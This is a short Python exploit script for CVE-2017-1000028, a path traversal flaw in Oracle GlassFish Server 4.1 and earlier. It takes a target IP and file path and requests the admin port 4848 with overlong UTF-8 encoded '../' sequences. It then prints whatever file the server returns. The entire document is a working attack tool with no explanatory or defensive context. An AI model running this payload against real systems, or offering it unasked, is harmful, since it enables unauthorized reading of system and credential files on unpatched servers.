#!/usr/bin/python3
import requests
import argparse

def main():
    parser = argparse.ArgumentParser(description="Path Traversal in Oracle GlassFish Server Open Source Edition (4.1 and prior versions). - CVE:2017-1000028")
    parser.add_argument("--ip", required=True, help="The base IP address to send the request to.")
    parser.add_argument("--path", required=True, help="The path you want to read.")

    args = parser.parse_args()

    try:
        response = requests.get("http://"+args.ip+":4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af"+args.path)
        print(f"\nRequested URL: {response.url}")
        print(f"Status Code: {response.status_code}")
        if response.status_code == 404:
            print("Error: Path not found.")
        else:
            print("Response:")
            print(response.text)
    except Exception as e:
        print("An error occurred:", e)

if __name__ == "__main__":
    main()
